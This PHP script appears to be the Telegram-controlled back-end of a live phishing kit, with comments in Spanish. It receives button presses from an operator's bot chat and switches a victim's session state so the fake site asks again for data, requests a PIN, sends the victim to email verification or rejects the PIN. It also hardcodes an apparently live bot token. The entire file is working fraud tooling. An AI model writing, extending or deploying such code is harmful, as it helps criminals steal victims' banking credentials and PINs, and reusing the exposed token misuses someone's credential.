<?php
// Leer la entrada que envía Telegram al presionar un botón
$json_entrada = file_get_contents("php://input");
$update = json_decode($json_entrada, true);

if (isset($update['callback_query'])) {
    $callback_query = $update['callback_query'];
    $data = $callback_query['data']; 
    $chat_id = $callback_query['message']['chat']['id'];
    $message_id = $callback_query['message']['message_id'];

    // Romper la cadena del botón: "redirigir|ID_SESION|ACCION"
    $partes = explode('|', $data);

    if (count($partes) === 3 && $partes[0] === 'redirigir') {
        $id_sesion = $partes[1];
        $accion = $partes[2];

        $ruta_archivo = "sesiones/{$id_sesion}.json";

        if (file_exists($ruta_archivo)) {
            $datos = json_decode(file_get_contents($ruta_archivo), true);

            // Evaluar la acción del botón de Telegram y cambiar el estado del JSON
            $texto_confirmacion = "";
            if ($accion === 'datos_malos') {
                $datos['estado'] = 'index_error';
                $texto_confirmacion = "❌ Solicitando datos correctos.";
            } elseif ($accion === 'pedir_pin') {
                $datos['estado'] = 'pin_normal';
                $texto_confirmacion = "🔑 Solicitando código PIN.";
            } elseif ($accion === 'correo') {
                $datos['estado'] = 'correo_ok';
                $texto_confirmacion = "📧 Enviado a Verificación por Correo.";
            } elseif ($accion === 'pin_malo') {
                $datos['estado'] = 'pin_rebotado';
                $texto_confirmacion = "⚠️ Devuelto: PIN Incorrecto.";
            }

            // Guardar el nuevo estado para que esperar.php lo lea y redirija
            file_put_contents($ruta_archivo, json_encode($datos));

            // Tu Token activo para responderle a Telegram y confirmar el clic
            $token = "9156419748:AAFXdu2ORQoLuvGXuISZ9xfxEfdeEUVgRBw";

            // 1. Responder al Callback Query para quitar el reloj de carga del botón en Telegram
            $payload_answer = [
                'callback_query_id' => $callback_query['id'],
                'text' => "Acción procesada con éxito"
            ];
            $ch1 = curl_init("https://api.telegram.org/bot{$token}/answerCallbackQuery");
            curl_setopt($ch1, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch1, CURLOPT_POSTFIELDS, http_build_query($payload_answer));
            curl_exec($ch1);
            curl_close($ch1);

            // 2. Modificar el mensaje en tu chat de Telegram para confirmar qué botón tocaste
            $nuevo_texto = $callback_query['message']['text'] . "\n\n⚡ Comando Ejecutado: " . $texto_confirmacion;
            $payload_edit = [
                'chat_id' => $chat_id,
                'message_id' => $message_id,
                'text' => $nuevo_texto,
                'parse_mode' => 'Markdown'
            ];
            $ch2 = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query($payload_edit));
            curl_exec($ch2);
            curl_close($ch2);
        }
    }
}
echo "OK";
?>